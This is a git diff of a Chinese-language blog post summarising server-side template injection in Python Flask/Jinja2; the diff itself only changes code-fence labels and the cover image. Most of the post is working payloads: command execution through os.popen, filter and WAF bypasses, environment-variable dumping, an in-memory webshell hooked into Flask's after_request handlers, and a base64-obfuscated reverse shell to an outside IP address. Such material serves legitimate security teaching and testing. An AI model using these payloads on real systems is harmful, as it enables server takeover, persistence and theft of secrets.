@@ -4,11 +4,11 @@ description: "SSTI 注入漏洞总结，整理模板注入的判断方法、利�
 pubDate: "2025-12-08"
 updatedDate: "2025-12-08"
 tags: ["SSTI", "漏洞总结", "Web安全"]
-cover: auto
+cover: "9de5ee687db5a351ad422c1fbb44a3e14aae8e98_raw..jpg"
 coverAlt: "SSTI注入漏洞总结 的文章封面"
 draft: false
 ---
-# SSTI注入漏洞总结(python)
+## SSTI注入漏洞总结(python)
 
 ## 什么是SSTI
 
@@ -18,7 +18,7 @@ SSTI（Server-Side Template Injection，服务器端模板注入）漏洞是由�
 
 ## 如何利用SSTI
 
-```
+```python
 from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
@@ -44,7 +44,7 @@ if __name__ == '__main__':
 对象可以是以下的几种符号( [] , '' , () , {} )
 
 以下均是拿基类的操作
-```
+```python
 [].__class__.__base__
 
 ''.__class__.__base__
@@ -56,13 +56,13 @@ if __name__ == '__main__':
 
 也可以
 
-```
+```python
 ''.__class__.__mro__[-1]
 ```
 
 通过模板语法我们可以得知那些子类含有builtins
 
-```
+```text
 {% for x in [].__class__.__base__.subclasses__() %}
     {% if x.__init__ and x.__init__.__globals__ and x.__init__.__globals__.__builtins__ %}
         index : {{loop.index0}}<br>
@@ -75,7 +75,7 @@ if __name__ == '__main__':
 
 通过模板语法我们也可以直接命令执行
 
-```
+```text
 模板语法payload，直接在popen命令执行
 {% for x in [].__class__.__base__.__subclasses__() %}
     {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'eval' in x.__init__.__globals__['__builtins__']['eval'].__name__ %}
@@ -84,7 +84,7 @@ if __name__ == '__main__':
 {% endfor %}
 ```
 
-```
+```text
 {{().__class__.__base__}}  拿基类
 {{().__class__.__base__.__subclasses__()}}  拿子类
 {{().__class__.__base__.__subclasses__()[103]}}找一个含builtins的类
@@ -121,13 +121,13 @@ if __name__ == '__main__':
 
 这些全局对象可以直接调用全局变量，比如
 
-```
+```text
 {{ lipsum.__globals__ }}
 ```
 
 然后按着下面的逻辑，来实现命令执行
 
-```
+```text
 {{lipsum.__globals__.__builtins__}}
 {{lipsum.__globals__.__builtins__['eval']('__import__("os").popen("ls /").read()')}}
 
@@ -151,7 +151,7 @@ if __name__ == '__main__':
 
 我们可以通过 [ ] 和 ' ' 以及 + 绕过
 
-```
+```text
 {{''['_'+'_class_'+'_']['_'+'_base_'+'_']['_'+'_subclasses_'+'_']}}
 {{''['_'+'_class_'+'_']['_'+'_base_'+'_']['_'+'_subclasses_'+'_']()[103]['_'+'_init_'+'_']}}
 {{''['_'+'_class_'+'_']['_'+'_base_'+'_']['_'+'_subclasses_'+'_']()[103]['_'+'_init_'+'_']['_'+'_glo'+'bals_'+'_']}}
@@ -164,7 +164,7 @@ if __name__ == '__main__':
 
 如果[]也被过滤了，我们可以使用过滤器，attr()绕过
 
-```
+```text
 {{''|attr('_'+'_c'+'la'+'ss'+'__')}}
 {{''|attr('__class__')}}
 {{''|attr('__class__')|attr('__base__')}}
@@ -173,7 +173,7 @@ if __name__ == '__main__':
 
 4.存在一种情况，当'cl' 'as' 's_'被过滤时，我们有一个很神奇的方法
 
-```
+```text
 {{[]['__ssalc__'[::-1]]}}
 {{ ''|attr('__ssalc__'[::-1]) }}
 ```
@@ -184,7 +184,7 @@ if __name__ == '__main__':
 
 使用request请求来绕
 
-```
+```text
 request.args.key  #获取get传入的key的值
 
 request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
@@ -200,7 +200,7 @@ request.data  #获取post传入参数(Content-Type:a/b)
 request.json  #获取post传入json参数 (Content-Type: application/json)
 ```
 
-```
+```text
 {{[].__class__.__base__.__subclasses__()[103].__init__.__globals__.__builtins__.__import__(request.args.os).popen(request.args.cmd).read()}}
 ?os=os&cmd=ls /
 ```
@@ -211,7 +211,7 @@ request.json  #获取post传入json参数 (Content-Type: application/json)
 
 unicode编码可以绕过下划线
 
-```
+```text
 {% print(lipsum['\x5f\x5fglo'+'bals\x5f\x5f']['os'].popen('env').read())%}
 ```
 
@@ -223,7 +223,7 @@ waf常用的就讲这么多，接下来我们讲一点高级的
 
 1.写静态目录
 
-```
+```text
 {{url_for.__globals__.__builtins__.__import__('os').popen("mkdir /app/static").read()}}
 {{url_for.__globals__.__builtins__.__import__('os').popen('echo "SUCCESS" >/app/static/pwn.txt ')}}
 {{url_for.__globals__.__builtins__.__import__('os').popen('ls / > /app/static/ls.txt')}}
@@ -233,13 +233,13 @@ waf常用的就讲这么多，接下来我们讲一点高级的
 
 2.内存马
 
-```
+```text
 {{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})}}
 ```
 
 3.404页面污染(或者写SERVER)
 
-```
+```text
 {{ url_for.__globals__['__builtins__']['setattr'](url_for.__globals__['__builtins__']['__import__']('sys').modules['werkzeug.exceptions'].NotFound,'description','SSTI_SUCCESS_404') }}
 
 {{ url_for.__globals__['__builtins__']['setattr'](url_for.__globals__['__builtins__']['__import__']('sys').modules['werkzeug.exceptions'].NotFound,'description',url_for.__globals__['__builtins__']['__import__']('os').popen('ls /').read().strip()) }}
@@ -251,7 +251,7 @@ waf常用的就讲这么多，接下来我们讲一点高级的
 
 5.反弹shell
 
-```
+```text
 {{lipsum.__globals__['os'].popen('bash${IFS}-c${IFS}\'{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTcuMjMuNDAvMTExMSAwPiYx}|{base64,-d}|{bash,-i}\'').read()}}
 ```
 
